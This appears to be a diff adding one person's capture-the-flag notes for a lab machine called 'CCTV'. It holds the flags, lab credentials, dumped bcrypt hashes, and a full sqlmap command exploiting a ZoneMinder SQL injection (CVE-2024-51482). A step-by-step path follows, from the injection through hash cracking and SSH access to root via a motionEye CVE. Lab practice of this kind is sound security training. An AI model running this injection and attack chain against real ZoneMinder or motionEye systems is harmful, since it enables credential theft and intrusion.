@@ -1,0 +1,73 @@
+Machine : CCTV
+Difficulty : Easy
+OS : Linux
+
+User Flag : 4ab354a54713d413276661c7eae9f4f8
+Root Flag : 7d4341da4eb04fa88ad5ba65c98598b6
+
+ADDRESS : 10.129.22.40
+URL : http://cctv.htb
+
+Guide : https://www.ibrahimisiaqbolaji.com/2026/03/cctv-hack-box-walkthrough.html
+_______________________________________________________________________________________________________________ 
+
+#Technology
+Openssh 9.6p1
+Ubuntu 13.14
+Apache httpd 2.4.58
+Zoneminder 1.37.63
+Motioneye 0.43.1b4
+
+#Ports
+22:ssh
+80:http
+
+#Vulnerabilities
+SQL Injection : CVE-2024-51482 (https://github.com/BridgerAlderson/CVE-2024-51482)
+Dirty Frag : CVE-2026-43284 / CVE-2026-43500
+Pack2theRoot : CVE-2026-41651 (https://github.com/0xBlackash/CVE-2026-41651)
+CVE-2025-60787 (https://github.com/gunzf0x/CVE-2025-60787)
+
+#Stuff
+Zoneminder login at cctv.htb/zm
+CVE-2024-51482 is exploitable with tool 'sqlmap'; i aint doing that again.
+ran 'ssh -L 8765:127.0.0.1:8765 mark@10.129.22.40' then visited http://127.0.0.1:8765 and found an admin panel
+motion eye version is vulnerable to CVE-2025-60787
+
+#Creadentials
+Zoneminder : admin/admin
+Server : mark:opensesame
+MOtion eye : admin:989c5a8ee87a0e9521ec81a79187d162109282f0
+
+#Commands
+SQLMAP : sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
+-D zm -T Users -C Username,Password --dump --batch \
+--dbms=MySQL --technique=T \
+--cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk" \
+--time-sec=2
+
+#Artifacts
+HASHES: 
++------------+--------------------------------------------------------------+
+| Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
+| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
++------------+--------------------------------------------------------------+
+
+/etc/motioneye/motion.conf:# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+
+#Process
+1. nmap discover webapp
+2. webapp link to zoneminder login
+3. login with admin:admin
+4. Exploit Zoneminder with CVE-2024-51482
+5. Extract hashes from database
+6. crack hash to get mark password
+7. ssh to target with mark credentials
+8. discover motioneye; admin password hash in .conf file; 
+9. port forward and ssh to 127.0.0.1:8765 ; motion eye admin panel
+10. login with admin credentials
+11. execute CTVE-2025-60787 against target
+12. gained root access and retrieved flags
